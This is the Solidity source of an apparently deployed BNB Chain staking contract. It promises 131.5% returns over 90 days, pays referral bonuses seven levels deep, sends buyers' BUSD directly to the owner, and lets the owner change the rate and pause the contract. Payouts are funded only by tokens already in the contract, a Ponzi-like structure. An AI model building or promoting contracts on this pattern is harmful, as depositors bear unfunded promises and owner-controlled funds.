/**
 *Submitted for verification at BscScan.com on 2021-11-08
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-01
 */

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.4;

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract FRS_Staking {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address referral;
        address[] referrers;
        uint256 firstLevelDeposit;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        uint8 reflevel;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) deposit_per_level;
    }

    address payable public owner;

    struct Leaderboard {
        uint256 amount;
        address addr;
    }

    Leaderboard[11] public toptotal;

    uint8 public investment_days;
    uint256 public investment_perc;
    uint256 public rate;
    uint256 public saleBalance;
    bool public isActive = false;

    IBEP20 public token;
    IBEP20 public BUSD;

    uint256 public total_investors;
    uint256 public total_invested;
    uint256 public total_withdrawn;
    uint256 public total_referral_bonus;

    uint256 public full_release;

    uint8[7] private referral1 = [100, 70, 30, 0, 0, 0, 0];
    uint8[7] private referral2 = [150, 150, 70, 40, 40, 0, 0];
    uint8[7] private referral3 = [200, 200, 100, 70, 70, 50, 50];

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor(
        address _token,
        uint256 _rate,
        address _busd,
        address _owner
    ) {
        owner = payable(_owner);
        token = IBEP20(_token);
        rate = _rate;
        BUSD = BUSD = IBEP20(_busd); //busd contract
        investment_days = 90; //Total 90 days
        investment_perc = 1315; //Total 131.5 %

        full_release = 1600990000;
    }

    receive() external payable {
        revert("BNB deposit not supported");
    }

    function updateSaleBalance() external onlyOwner {
        require(!isActive, "Contract already active!!");
        saleBalance = token.balanceOf(address(this));
        isActive = true;
    }

    function setContractState(bool value) external onlyOwner {
        isActive = value;
    }

    function setRate(uint256 value) external onlyOwner {
        rate = value;
    }

    function setNewOwner(address _owner) external onlyOwner {
        owner = payable(_owner);
    }

    function buyTokens(address _referral, uint256 _buyAmount) external {
        require(
            BUSD.allowance(msg.sender, address(this)) >= _buyAmount,
            "BUSD : Set allowance first!"
        );
        bool success = BUSD.transferFrom(msg.sender, address(this), _buyAmount);
        require(success, "BUSD : Transfer failed");
        uint256 tokenAmount = _buyAmount.mul(rate);
        saleBalance = saleBalance.sub(tokenAmount);
        BUSD.transfer(owner, _buyAmount);
        _deposit(msg.sender, _referral, tokenAmount);
    }

    function deposit(address _referral, uint256 _amount) external {
        require(isActive, "Contract paused from manual deposit!!");
        require(
            token.allowance(msg.sender, address(this)) >= _amount,
            "FRS : Set allowance first!"
        );
        bool success = token.transferFrom(msg.sender, address(this), _amount);
        require(success, "FRS : Transfer failed");
        _deposit(msg.sender, _referral, _amount);
    }

    function _deposit(
        address sender,
        address _referral,
        uint256 _amount
    ) internal {
        Player storage player = players[sender];
        require(
            _amount >= (1 ether) && _amount <= (100000 ether),
            "Amount between 1 and 100k only!!"
        );
        require(player.deposits.length < 150, "Max 150 deposits per address");
        require(uint256(block.timestamp) > full_release, "Not launched");
        _setReferral(sender, _referral, _amount);

        player.deposits.push(
            PlayerDeposit({
                amount: _amount,
                totalWithdraw: 0,
                time: uint256(block.timestamp)
            })
        );

        if (player.total_invested == 0x0) {
            total_investors += 1;
        }

        player.total_invested += _amount;
        players[player.referral].firstLevelDeposit += _amount;

        if (player.total_invested >= 200 ether) {
            player.reflevel = 1;
        }
        if (player.total_invested >= 5001 ether) {
            player.reflevel = 2;
        }
        if (player.total_invested >= 25001 ether) {
            player.reflevel = 3;
        }
        total_invested += _amount;

        updateTop10(sender);
        updateTop10(_referral);

        emit Deposit(sender, _amount);
    }

    function _setReferral(
        address _addr,
        address _referral,
        uint256 _amount
    ) private {
        if (players[_addr].referral == address(0)) {
            require(
                (_referral != _addr &&
                    players[_referral].total_invested != 0) ||
                    _referral == owner,
                "Self referral prohibited/Only existing user as referral!!"
            );
            players[_addr].referral = _referral;
            players[_referral].referrers.push(_addr);

            for (uint8 i = 0; i < 7; i++) {
                players[_referral].referrals_per_level[i]++;
                players[_referral].deposit_per_level[i] += _amount;
                _referral = players[_referral].referral;
                if (_referral == address(0) || _referral == owner) break;
            }
        }
    }

    function updateTop10(address _add) private returns (bool) {
        uint256 total = players[_add].total_invested +
            players[_add].firstLevelDeposit;
        if (toptotal[9].amount > total) {
            return false;
        }
        for (uint8 i = 0; i < 10; i++) {
            if (total > toptotal[i].amount) {
                for (uint8 j = 10; j > i; j--) {
                    toptotal[j].amount = toptotal[j - 1].amount;
                    toptotal[j].addr = toptotal[j - 1].addr;
                }
                toptotal[i].amount = total;
                toptotal[i].addr = _add;
                break;
            }
        }
        return true;
    }

    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for (uint8 i = 0; i < 7; i++) {
            if (ref == address(0)) break;
            uint256 bonus;
            if (players[ref].reflevel == 1) {
                bonus = (_amount * referral1[i]) / 1000;
            } else if (players[ref].reflevel == 2) {
                bonus = (_amount * referral2[i]) / 1000;
            } else if (players[ref].reflevel == 3) {
                bonus = (_amount * referral3[i]) / 1000;
            }

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i + 1));
            ref = players[ref].referral;
        }
    }

    function withdraw() external {
        require(uint256(block.timestamp) > full_release, "Not launched");
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(
            player.dividends > 0 || player.referral_bonus > 0,
            "Zero amount"
        );

        uint256 amount = player.dividends + player.referral_bonus;

        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

        _referralPayout(msg.sender, amount);

        token.transfer(msg.sender, amount);

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if (payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time
                ? player.last_payout
                : dep.time;
            uint256 to = block.timestamp > time_end
                ? time_end
                : uint256(block.timestamp);

            if (from < to) {
                player.deposits[i].totalWithdraw +=
                    (dep.amount * (to - from) * investment_perc) /
                    investment_days /
                    86400000;
            }
        }
    }

    function payoutOf(address _addr) external view returns (uint256 value) {
        Player storage player = players[_addr];

        for (uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time
                ? player.last_payout
                : dep.time;
            uint256 to = block.timestamp > time_end
                ? time_end
                : uint256(block.timestamp);

            if (from < to) {
                value +=
                    (dep.amount * (to - from) * investment_perc) /
                    investment_days /
                    86400000;
            }
        }

        return value;
    }

    function contractInfo()
        external
        view
        returns (
            uint256 _total_invested,
            uint256 _total_investors,
            uint256 _total_withdrawn,
            uint256 _total_referral_bonus
        )
    {
        return (
            total_invested,
            total_investors,
            total_withdrawn,
            total_referral_bonus
        );
    }

    function referralInfo(address _addr)
        external
        view
        returns (address[] memory referral)
    {
        Player storage player = players[_addr];
        address[] memory _referral = new address[](player.referrers.length);
        for (uint256 i = 0; i < player.referrers.length; i++) {
            _referral[i] = player.referrers[i];
        }
        return _referral;
    }

    function displayTop10()
        external
        view
        returns (address[10] memory addr, uint256[10] memory amount)
    {
        for (uint256 i = 0; i < 10; i++) {
            addr[i] = toptotal[i].addr;
            amount[i] = toptotal[i].amount;
        }

        return (addr, amount);
    }

    function displayLines(address addr)
        external
        view
        returns (uint256[7] memory _addr, uint256[7] memory amount)
    {
        for (uint8 i = 0; i < 7; i++) {
            _addr[i] = players[addr].referrals_per_level[i];
            amount[i] = players[addr].deposit_per_level[i];
        }

        return (_addr, amount);
    }

    function userInfo(address _addr)
        external
        view
        returns (
            uint256 for_withdraw,
            uint256 withdrawable_referral_bonus,
            uint256 invested,
            uint256 withdrawn,
            uint256 referral_bonus,
            uint256[8] memory referrals
        )
    {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for (uint8 i = 0; i < 7; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals
        );
    }

    function investmentsInfo(address _addr)
        external
        view
        returns (
            uint256[] memory endTimes,
            uint256[] memory amounts,
            uint256[] memory totalWithdraws
        )
    {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](
            player.deposits.length
        );

        for (uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            _amounts[i] = dep.amount;
            _totalWithdraws[i] = dep.totalWithdraw;
            _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (_endTimes, _amounts, _totalWithdraws);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Substraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
}